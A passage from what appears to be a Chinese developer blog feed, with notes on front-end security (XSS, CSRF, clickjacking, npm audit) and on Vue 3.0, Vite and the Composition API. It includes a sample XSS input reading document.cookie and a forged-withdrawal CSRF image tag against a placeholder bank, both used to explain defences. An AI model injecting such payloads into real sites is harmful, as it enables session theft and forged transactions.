punctuation">,</span> <span class="token punctuation">{</span>        search<span class="token punctuation">:</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>search <span class="token comment" spellcheck="true">// 通过地址栏传递</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'http://loalhost:3000/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!-- index.html --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 输入框内输入 &lt;script>alert(document.cookie)&lt;/script> --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">></span></span>搜索<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>{{ if search }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> 展示搜索内容 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    {{ /if }}</code></pre><h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><ul><li>攻击者将恶意代码提交到目标网站的数据库中</li><li>用户打开目标网站时，服务端将恶意代码从数据库中取出，拼接在html中返回给浏览器</li><li>用户浏览器接收响应解析时，取出恶意代码执行</li><li>这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</li></ul><blockquote><p>比如一个富文本编辑器，产生的结果：html格式的字符串，web后台存储到数据库中</p><p>当其他用户查看文章详情时，就会渲染文章内容，将恶意代码执行</p></blockquote><h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4><blockquote><p>DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。</p><p>在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 <code>.textContent</code>、<code>.setAttribute()</code> 等。</p><p>如果用 Vue/React 技术栈，并且不使用 <code>v-html</code>/<code>dangerouslySetInnerHTML</code> 功能，就在前端 render 阶段避免 <code>innerHTML</code>、<code>outerHTML</code> 的 XSS 隐患。</p><p>DOM 中的内联事件监听器，如 <code>location</code>、<code>onclick</code>、<code>onerror</code>、<code>onload</code>、<code>onmouseover</code> 等，<code>&lt;a&gt;</code> 标签的 <code>href</code> 属性，JavaScript 的 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code> 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。</p><p>DOM 型和前两种的区别：DOM 型 XSS中，取出和执行恶意代码由浏览器端完成，其他两种都属于服务端安全漏洞</p></blockquote><h3 id="XSS-攻击注入点"><a href="#XSS-攻击注入点" class="headerlink" title="XSS 攻击注入点"></a>XSS 攻击注入点</h3><ul><li>HTML中内嵌文本，恶意代码以 script 标签注入</li><li>标签的 href, src 等属性中，包含 javascript 等可执行代码</li><li>在 onload, onerror, onclick 等事件中</li><li>style 属性和标签中，包含 background-image: url(“javascript”)</li><li>style 属性和标签中，包含 expression(…) 的 CSS 表达式代码</li></ul><h3 id="XSS-防御"><a href="#XSS-防御" class="headerlink" title="XSS 防御"></a>XSS 防御</h3><p>XSS 攻击有两大要素：</p><ul><li>攻击者提交恶意代码</li><li>浏览器执行恶意代码</li></ul><p>常见解决办法：</p><ul><li>纯前端渲染，将代码和数据分隔开<ul><li>浏览器先加载一个静态HTML，此HTML不包含任何跟业务相关数据</li><li>然后浏览器执行 HTML 中的 Javascript</li><li>Javascript 通过 Ajax加载业务数据，调用 DOM API 更新到页面上</li></ul></li><li>对 HTML 做充分转义<ul><li>&amp; &lt; &gt; “ ‘ /‘</li><li>转义库 js-xss</li></ul></li><li>CSP：内容安全策略</li><li>X-Xss-Protection</li></ul><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><ul><li><p><strong>XSS 利用的是网站对用户（输入）的信任，而CSRF 利用的是网站对用户网页浏览器的信任。</strong></p></li><li><p><a href="https://pic002.cnblogs.com/img/hyddd/200904/2009040916453171.jpg" target="_blank" rel="noopener">CSRF图示</a></p></li><li><p>CSRF通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对CSRF的防护能力来提升安全性</p></li><li><p>CSRF的两个特点：</p><ul><li>CSRF（通常）发生在第三方域名。</li><li>CSRF攻击者不能获取到Cookie等信息，只是使用。</li></ul></li><li><p>针对这两点，我们可以专门制定防护策略，如下：</p><ul><li><p>阻止不明外域的访问</p></li><li><ul><li><p>同源检测</p><ul><li><p>Origin：两种情况不可行（ie11同源策略，302重定向）</p></li><li><p>Referer：但攻击者可以隐藏 Referer</p></li><li><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://bank.example/withdraw?amount<span class="token punctuation">=</span>10000&amp;for<span class="token punctuation">=</span>hacker<span class="token punctuation">"</span></span> <span class="token attr-name">referrerpolicy</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>no-referrer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> </code></pre></li></ul></li><li><p>Samesite Cookie</p><ul><li>strict：完全禁止第三方 Cookie</li><li>lax：大多数情况也是不发送第三方 Cookie</li><li>None：Chrome 计划将<code>Lax</code>变为默认设置。这时，网站可以选择显式关闭<code>SameSite</code>属性，将其设为<code>None</code>。不过，前提是必须同时设置<code>Secure</code>属性（Cookie 只能通过 HTTPS 协议发送），否则无效。</li></ul></li></ul></li><li><p>提交时要求附加本域才能获取的信息</p></li><li><ul><li>CSRF Token</li></ul></li></ul><ul><li>验证码<ul><li>CSRF攻击是伪造成用户的身份，自动发起恶意的请求。那么我们可以强迫攻击者与我们的网站进行交互。在一些操作之前加入验证码校验，可以抵御一部分的CSRF攻击。但是加入验证码会影响用户的体验，所以验证码不能作为主要的防御手段。</li></ul></li></ul></li><li><p><a href="https://juejin.cn/post/6844904004288249870" target="_blank" rel="noopener">跨站请求伪造—CSRF</a></p></li></ul><h2 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h2><ul><li><a href="https://cdn.nlark.com/yuque/0/2020/png/152778/1608265590815-5fdff14b-6acd-4265-9593-dbb409e5d538.png?x-oss-process=image%2Fresize%2Cw_1038" target="_blank" rel="noopener">点击劫持图示</a></li></ul><blockquote><p>黑客创建一个网页利用 iframe 包含目标网站；</p><p>隐藏目标网站，使用户无法无法察觉到目标网站存在；</p><p>构造网页，诱变用户点击特点按钮</p><p>用户在不知情的情况下点击按钮，触发执行恶意网页的命令。</p></blockquote><ul><li><p>防御手段</p><ul><li><p>JavaScript 禁止内嵌</p><ul><li><p><code>window.top</code> 属性返回当前窗口的最顶层浏览器窗口对象，在 iframe 中的 <code>window</code> 指的是 iframe 窗口对象</p></li><li><pre class=" language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span>top<span class="token punctuation">.</span>location <span class="token operator">!==</span> window<span class="token punctuation">.</span>location<span class="token punctuation">)</span> <span class="token punctuation">{</span>  top<span class="token punctuation">.</span>location <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">}</span></code></pre></li></ul></li><li><p>X-FRAME-OPTIONS 禁止内嵌</p><ul><li><code>DENY</code>：表示页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。</li><li><code>SAMEORIGIN</code>：表示该页面可以在相同域名页面的 frame 中展示。</li><li><code>ALLOW-FROM url</code>：表示该页面可以在指定来源的 frame 中展示。</li></ul></li></ul></li></ul><h2 id="HTTP传输安全"><a href="#HTTP传输安全" class="headerlink" title="HTTP传输安全"></a>HTTP传输安全</h2><ul><li>http 明文传输不安全</li><li><a href="https://www.jinjingxuan.com/2020/11/23/%E6%95%B4%E7%90%86-%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%9B%B8%E5%85%B3/#toc-heading-6" target="_blank" rel="noopener">网络协议相关</a></li></ul><h2 id="第三方依赖安全"><a href="#第三方依赖安全" class="headerlink" title="第三方依赖安全"></a>第三方依赖安全</h2><p>现如今进行应用开发，无论是后端服务器应用还是前端应用开发，绝大多数时候我们都是在借助开发框架和各种类库进行快速开发。然而，一些第三方的依赖或者插件存在很多安全性问题，也会存在这样那样的漏洞，所以使用起来得谨慎。</p><ul><li>尽量减少第三方依赖，选用相对成熟的依赖包 </li><li>定期使用 npm audit 检测依赖包的风险</li></ul><p>为了提高 npm 依赖的安全，npm 6.1 后添加了 npm audit 工具，这个工具可以搜索当前项目中使用的依赖是否存在安全问题，并提供了 npm audit fix 工具修复。</p><p>它的工作原理是维护了一个已知不良依赖的名单，如果代码中使用了直接从 GitHub 而不是 npm 仓库中获取依赖，或不知名的依赖。npm audit 也是无法发现威胁。总的来说在加入第三方依赖时，需要谨慎考虑，不滥用依赖在前端开发也是非常重要的。</p><h2 id="控制台注入代码"><a href="#控制台注入代码" class="headerlink" title="控制台注入代码"></a>控制台注入代码</h2><p><a href="https://www.tmall.com/" target="_blank" rel="noopener">详见天猫官网控制台</a></p><h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><p>点击不可信链接输入用户名密码</p><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><ul><li><a href="https://cn.vuejs.org/v2/guide/security.html#Vue-%E7%9A%84%E5%AE%89%E5%85%A8%E6%8E%AA%E6%96%BD" target="_blank" rel="noopener">Vue 的安全措施</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue3.0（一）</title>
      <link href="2020/12/17/Vue-Vue3.0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>2020/12/17/Vue-Vue3.0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>Vue.js 3.0</li><li>目录结构</li><li>构建版本</li><li>Composition API</li><li>函数式编程</li><li>性能提升</li><li>Vite</li><li>reactive/toRefs/ref</li><li>Computed/Watch/WatchEffect</li></ul><h1 id="Vue-js-3-0"><a href="#Vue-js-3-0" class="headerlink" title="Vue.js 3.0"></a>Vue.js 3.0</h1><ul><li>源码组织方式的变化<ul><li>采用 TS 重写</li><li>使用 Monorepo 管理项目结构</li></ul></li><li>Composition API</li><li>性能提升</li><li>Vite</li></ul><h1 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h1><blockquote><p>packages目录下有许多模块/包。Monorepo 是管理项目代码的一个方式，指在一个项目仓库 (repo) 中管理多个模块/包 (package)，不同于常见的每个模块建一个 repo。<a href="https://juejin.cn/post/6844903961896435720" target="_blank" rel="noopener">Vue3.0 中的 monorepo 管理模式</a></p></blockquote><ul><li>compiler-core：平台无关的编译器</li><li>compiler-dom：浏览器平台下的编译器，依赖于compiler-core</li><li>compiler-sfc：（single file component）编译单文件组件</li><li>compiler-ssr：服务端渲染的编译器</li><li>reactivity：数据响应式系统</li><li>runtime-core：平台无关的运行时</li><li>runtime-dom：浏览器平台下的运行时</li><li>runtime-test：为了测试的运行时，dom树是js对象，可运行于所有js环境里</li><li>server-renderer：服务端渲染</li><li>shared：vue内部使用的一些公共的API</li><li>size-check：一个私有的包，不会发布到npm，在treeshaking后检查包的大小</li><li>template-explorer：实时编译组件。输出render函数</li><li>vue：构建完整版的vue</li></ul><h1 id="构建版本"><a href="#构建版本" class="headerlink" title="构建版本"></a>构建版本</h1><ul><li>cjs（commonJs规范）<ul><li>vue.cjs.js</li><li>vue.cjs.prod.js</li></ul></li><li>global（可以直接通过script引入，增加全局vue对象，runtime是只包含运行时）<ul><li>vue.global.js</li><li>vue.global.prod.js</li><li>vue.runtime.global.js</li><li>vue.runtime.global.prod.js</li></ul></li><li>browser（通过script type=module方式引入）<ul><li>vue.esm-browser.js</li><li>vue.esm-browser.prod.js</li><li>vue.runtime.esm-browser.js</li><li>vue.runtime.esm-browser.prod.js</li></ul></li><li>bundler（没有打包的代码，要配合打包工具）<ul><li>vue.esm-bundler.js</li><li>vue.runtime.esm-bundler.js</li></ul></li></ul><h1 id="Composition-API"><a href="#Composition-API" class="headerlink" title="Composition API"></a>Composition API</h1><p>在 vue2.x 中采用的是 Options API</p><blockquote><p><code>在vue2中如何组织代码的</code>，<strong>我们会在一个vue文件中methods，computed，watch，data中等等定义属性和方法，共同处理页面逻辑，</strong>我们称这种方式为Options API</p></blockquote><ul><li>包含一个描述组件选项(data, methods, props等)的对象</li><li>Options API 开发复杂组件，同一个功能逻辑的代码被拆分到不同选项</li></ul><h3 id="Composition-API-1"><a href="#Composition-API-1" class="headerlink" title="Composition API"></a>Composition API</h3><ul><li>vue.js 3.0 新增的一组 API</li><li>一组基于函数的 API</li><li>可以更灵活的组织组件的逻辑</li></ul><p><a href="https://user-images.githubusercontent.com/499550/62783026-810e6180-ba89-11e9-8774-e7771c8095d6.png" target="_blank" rel="noopener">Composition API图示</a></p><p><a href="https://juejin.cn/post/6875253488017342478" target="_blank" rel="noopener">Vue3为什么要使用Composition API</a></p><h1 id="函数式编程"><a href="#函数式编程" class="headerlink" title="函数式编程"></a>函数式编程</h1><blockquote><p>Vue2 对外表现的编程模式基本就是：对象调用自己的数据和方法——<code>this</code> + <code>.</code> 操作。所以在 Vue2 时代，我们通常会把相关的数据和操作写在同一个对象里。但是到了 Vue3 的 <code>setup</code> 里，你几乎不会用到 <code>this</code> 了；变成了让函数来调用对象或是另一个函数——就是 FP 的特点了。通俗来说，就是从基于对象的编程（OOP）转向了函数式编程（FP）。</p></blockquote><h1 id="性能提升"><a href="#性能提升" class="headerlink" title="性能提升"></a>性能提升</h1><ul><li><p>响应式系统升级：采用 Proxy</p></li><li><p>编译优化</p><ul><li>Vue.js 2.x中通过标记静态根节点，优化 diff 的过程，静态节点仍需要 diff </li><li>Vue.js 3.0中标记和提升所有的静态根节点，diff 的时候只需要对比动态节点内容<ul><li>Fragments（升级 vetur 插件，没有根节点也不会报错，会创建一个 Fragment 片段）</li><li>静态提升（再次编译可以跳过静态根节点）</li><li>Patch flag</li><li>缓存事件处理函数</li></ul></li><li><p>例子：<a href="vue-next-template-explorer.netlify.app">模板编译网址</a></p><pre class=" language-html"><code class="language-html"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>app<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>static root         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>static node<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>static node<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>static node<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">:id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>{{ count }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>handler<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!-- 1. 删掉根节点试一下      2. 右上角options中选择 hoistStatic 提升静态节点      3. 右侧可以找到 patch flag      4. 右上角options可以开启缓存 --></span></code></pre></li></ul></li><li><p>源码体积的优化</p><ul><li>移除一些不常用的 API：inline-template, filter</li><li>Tree-shaking</li></ul></li></ul><h1 id="Vite"><a href="#Vite" class="headerlink" title="Vite"></a>Vite</h1><h3 id="ES-Module"><a href="#ES-Module" class="headerlink" title="ES Module"></a>ES Module</h3><ul><li>现代浏览器都支持 ES Module（ie 不支持）</li><li>通过下面的方式加载模块<ul><li><code>&lt;script type=&quot;module&quot; src=&quot;...&quot;&gt;&lt;/script&gt;</code></li></ul></li><li>支持模块的 script 默认延迟加载</li></ul><p>回顾浏览器加载模块（type=module会自动添加上defer属性）过程: <strong>加载模块并执行是在DOM树创建完毕之后，DOMContentLoaded之前执行</strong></p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>hello world<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>module<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./index.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// index.js</span><span class="token keyword">import</span> <span class="token punctuation">{</span> forEach <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./utils.js'</span><span class="token keyword">const</span> app <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#app'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>app<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token function">forEach</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> item <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 输出</span><span class="token comment" spellcheck="true">// Hello World</span><span class="token comment" spellcheck="true">// 1 2 3</span><span class="token comment" spellcheck="true">// DOMContentLoaded</span><span class="token comment" spellcheck="true">// （1）DOMContentLoaded 事件触发时，仅当DOM加载完成，不包括样式表，图片(譬如如果有async加载的脚本就不一定完成)。</span><span class="token comment" spellcheck="true">// （2）load 事件触发时，页面上所有的DOM，样式表，脚本，图片都已经加载完成了。</span></code></pre><h3 id="Vite-vs-Vue-CLI"><a href="#Vite-vs-Vue-CLI" class="headerlink" title="Vite vs Vue-CLI"></a>Vite vs Vue-CLI</h3><ul><li>Vite 在开发模式下不需要打包可以直接运行（开发模式下使用script type=module，不需要打包代码）</li><li>Vue-CLI 开发模式下必须对项目打包才可以运行</li><li>生产环境下使用 Rollup 打包（基于ES Modules的方式打包）</li></ul><h3 id="Vite-特点"><a href="#Vite-特点" class="headerlink" title="Vite 特点"></a>Vite 特点</h3><ul><li>快速冷启动</li><li>按需编译</li><li>模块热更新</li></ul><h3 id="Vite创建项目"><a href="#Vite创建项目" class="headerlink" title="Vite创建项目"></a>Vite创建项目</h3><pre class=" language-shell"><code class="language-shell">npm init vite-app <project-name>cd <project-name>npm installnpm run dev</code></pre><h3 id="基于模板创建项目"><a href="#基于模板创建项目" class="headerlink" title="基于模板创建项目"></a>基于模板创建项目</h3><pre class=" language-shell"><code class="language-shell">npm init vite-app --template react</code></pre><h1 id="Composition-API-详解"><a href="#Composition-API-详解" class="headerlink" title="Composition API 详解"></a>Composition API 详解</h1><h2 id="setup-入口函数"><a href="#setup-入口函数" class="headerlink" title="setup 入口函数"></a>setup 入口函数</h2><ul><li><p>setup 函数是组合式 API 的入口函数，它在 <strong>组件创建之前</strong> 被调用</p></li><li><p>因为在 <code>setup</code> 执行时组件尚未创建，<code>setup</code> 函数中的 <code>this</code> 不是当前组件的实例</p></li><li><p>函数接收两个参数，props 和 context，context 可以解构为 attrs、slots、emit 函数</p><ul><li>props：通过 <code>prop</code> 传递过来的<strong>所有数据</strong>，我们都可以在这里进行接收。并且获取到的数据将<strong>保持响应性</strong>。</li><li>context：context 是一个 <strong>JavaScript 对象</strong>，这个对象暴露了三个组件的属性，我们可以通过 <strong>解构</strong> 的方式来分别获取这三个属性<ul><li><strong>attrs：</strong> 它是绑定到组件中的 <strong>非 props</strong> 数据，并且是非响应式的。</li><li><strong>slots：</strong> 是组件的插槽，同样也不是 响应式的。</li><li><strong>emit：</strong> 是一个方法，相当于 vue2 中的 this.$emit 方法。</li></ul></li></ul></li><li><p>函数可以返回一个对象，对象的属性可以直接在模板中进行使用，就像之前使用 data 和 methods 一样。</p></li></ul><h2 id="一个简单的例子：实时显示鼠标位置"><a href="#一个简单的例子：实时显示鼠标位置" class="headerlink" title="一个简单的例子：实时显示鼠标位置"></a>一个简单的例子：实时显示鼠标位置</h2><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    x: {{ position.x }} <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    y: {{ position.y }}  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>module<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">import</span> <span class="token punctuation">{</span> createApp<span class="token punctuation">,</span> reactive<span class="token punctuation">,</span> onMounted<span class="token punctuation">,</span> onUnmounted <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./vue.esm-browser.js'</span>    <span class="token comment" spellcheck="true">// 把功能封装成一个函数，data，menthods，hooks都在这个函数中</span>    <span class="token keyword">function</span> useMousePosition <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// reactive 处理成响应式</span>      <span class="token keyword">const</span> position <span class="token operator">=</span> <span class="token function">reactive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        x<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        y<span class="token punctuation">:</span> <span class="token number">0</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>      <span class="token keyword">const</span> update <span class="token operator">=</span> e <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        position<span class="token punctuation">.</span>x <span class="token operator">=</span> e<span class="token punctuation">.</span>pageX        position<span class="token punctuation">.</span>y <span class="token operator">=</span> e<span class="token punctuation">.</span>pageY      <span class="token punctuation">}</span>      <span class="token function">onMounted</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'mousemove'</span><span class="token punctuation">,</span> update<span class="token punctuation">)</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>      <span class="token function">onUnmounted</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        window<span class="token punctuation">.</span><span class="token function">removeEventListener</span><span class="token punctuation">(</span><span class="token string">'mousemove'</span><span class="token punctuation">,</span> update<span class="token punctuation">)</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> position    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// creatAPP 创建 vue 对象</span>    <span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">createApp</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      setup <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> position <span class="token operator">=</span> <span class="token function">useMousePosition</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// return 给模板使用</span>        <span class="token keyword">return</span> <span class="token punctuation">{</span>          position        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span><span class="token function">mount</span><span class="token punctuation">(</span><span class="token string">'#app'</span><span class="token punctuation">)</span>  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><h2 id="生命周期钩子函数"><a href="#生命周期钩子函数" class="headerlink" 